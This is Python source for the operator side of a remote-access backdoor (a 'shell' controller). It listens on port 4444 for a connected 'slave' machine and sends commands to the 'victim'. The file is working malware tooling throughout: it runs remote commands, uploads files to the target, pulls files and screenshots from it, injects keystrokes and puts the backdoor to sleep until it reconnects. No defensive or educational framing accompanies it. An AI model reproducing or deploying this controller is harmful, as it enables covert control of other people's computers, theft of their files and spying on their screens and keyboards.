from math import ceil
import socket
import tqdm
import time
import os
import sys
from datetime import datetime

now = datetime.now()
ron = (str(now).split('.')[0])
dt = ron.replace(' ', '_')

#define server address and port
HOST = "IP ADDRESS"
PORT = 4444

#listen for incoming connections
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))

print('''\033[1;35m                _                            _          _ _
               | |                          | |        | | |
   ___ __ _  __| | ___ _ __  _   _ ___   ___| |__   ___| | |
  / __/ _` |/ _` |/ _ \ '_ \| | | / __| / __| '_ \ / _ \ | |
 | (_| (_| | (_| |  __/ | | | |_| \__ \ \__ \ | | |  __/ | |
  \___\__,_|\__,_|\___|_| |_|\__,_|___/ |___/_| |_|\___|_|_|
\033[0m''')

#define file upload function
def upload():
    upfile = command.split(" ")[1]
    if os.path.exists(upfile):
        upsize = os.path.getsize(upfile)
        conn.sendall((f"{upfile}<up>{upsize}").encode("UTF-8"))
        f = open(upfile, "rb")
        progress = tqdm.tqdm(range(upsize), f"uploading {upfile}", unit="B", unit_scale=True, unit_divisor=1024)
        while True:
            upbytes = f.read(20480)
            if upbytes == b'':
                conn.sendall(b'loser')
                f.close()
                progress.update(len(upbytes))
                progress.close() 
                print("file uploaded successfully")
                coman()
            else:
                progress.update(len(upbytes))
                conn.sendall(upbytes)
                time.sleep(0.1)
    else:
        print("file does not exist")

#define keystroke injection function
def keys():
    print('run HELP for list of extra keys. type keystrokes to send below:')
    while True:
        stroke = input('\033[1;34mk: \033[0m')
        if stroke == 'HELP':
            print('''\033[1;34m            O         O
             \\\\     // 
              \\\\   //
               \\\\ // 
              /~~~~~\\
,-------------------------------,
| ,----------------------------, |
| |      HELP: shows menu      | |
| |                            | |
| |         EXIT: exit         | |
| |     keystroke injector     | |
| |                            | |
| |      GUI = Window Key      | |
| |                            | |
| |      ALT, CTRL, SHIFT,     | |
| |         ENTER, DEL         | |
| |____________________________| |
|________________________________|
\033[0m''')
        elif stroke == 'EXIT':
            coman()
        else:
            keys = '<keys> ' + stroke
            conn.sendall((keys).encode('UTF-8'))

#define help menu function
def helper():
    print('''\033[1;35m   ________________________________
 / \                              \\
|   |       special commands       |
 \_ |                              |
    |     help: brings up menu     |
    |                              |
    |   upload: upload file from   |
    |    host machine to client    |
    |                              |
    |   download: download file    |
    |     from cleints machine     |
    |                              |
    |       keystrokes: send       |
    | keystrokes to target machine |
    |                              |
    |      screenshot: takes       |
    |   and downloads screenshot   |
    |                              |
    |   sleep: disconnect client   |
    |        for 5 minutes         |
    |                              |
    |    exit: close connection    |
    |   ___________________________|___
    |  /                            /
    \_/____________________________/
\033[0m''')
    coman()

#define file download function
def download():
    rec = (data.decode("UTF-8"))
    filename, filesize = rec.split("<sep>")
    filename = os.path.basename(filename)
    filesize = int(filesize)
    f = open(filename, "wb")
    progress = tqdm.tqdm(range(filesize), f"downloading {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    while True:
        filebytes = conn.recv(20480)
        if filebytes == b'five':
            f.close()
            progress.update(len(filebytes))
            progress.close()
            print("file successfully downloaded")
            coman()
        else:
            progress.update(len(filebytes))
            f.write(filebytes)

#define sleep function
def sleep():
    conn.sendall(('sleep').encode('UTF-8'))
    time.sleep(5)
    print('backdoor successfully sleeping. will reconnect in 5 minutes')
    conn.close()
    sys.exit()

#define screenshot function
def screenshot():
    conn.sendall(('<sc>').encode('UTF-8'))
    filename = (f'sc_{dt}.png')
    f = open(filename, 'wb')
    while True:
        scbytes = conn.recv(20480)
        if scbytes == b'done':
            f.close
            print(f"screenshot saved as {filename}")
            coman()
        elif scbytes == b'nono':
            f.close()
            os.remove(filename)
            print('no screen connected to device')
            coman()
        else:
            f.write(scbytes)

#define main command entry function
def coman():
    while True:
        global command
        #take in auser input
        command = input("\033[1;35m$ \033[0m")
        #pass to function depending on value
        if "upload" in command:
            upload()
        elif command == 'help':
            helper()
        elif command == 'keystrokes':
            keys()
        elif command == 'sleep':
            sleep()
        elif command == 'screenshot':
            screenshot()
        #if not passed to a function, send to victim as a command
        else:
            sender = (command).encode("UTF-8")
            conn.sendall(sender)
            global data
            data = conn.recv(2048)
            #if downloaded file was larger then 2048, countinue to pass the data to download function
            if "<sep>" in (data.decode("UTF-8")):
                download()
            #if victim closes connection, exit
            elif (data.decode("UTF-8")) == "connection successfully closed":
                print("connection successfully closed")
                exit()
            else:
                #print output for received messages
                if 'action complete. nothing to print.' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                elif 'file does not' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                elif 'file in folder' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                elif 'directory has been' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                elif 'file has been' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                elif 'connection successfully closed' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                elif 'action complete. nothing to print.' in (data.decode("UTF-8")):
                    print(data.decode("UTF-8"))
                else:
                    try:
                        recvbytes = int((data.decode('UTF-8')))
                        times = (int(ceil(recvbytes/2048)))
                        for x in range(times):
                            data2 = conn.recv(2048)
                            print(data2.decode('UTF-8'))
                            time.sleep(0.1)
                    except ValueError:
                        print('error running command')
                        pass
                    
def con():
    s.listen()
    global conn
    conn, addr = s.accept()
    print(f"slave connected at {addr}")
    coman()

con()
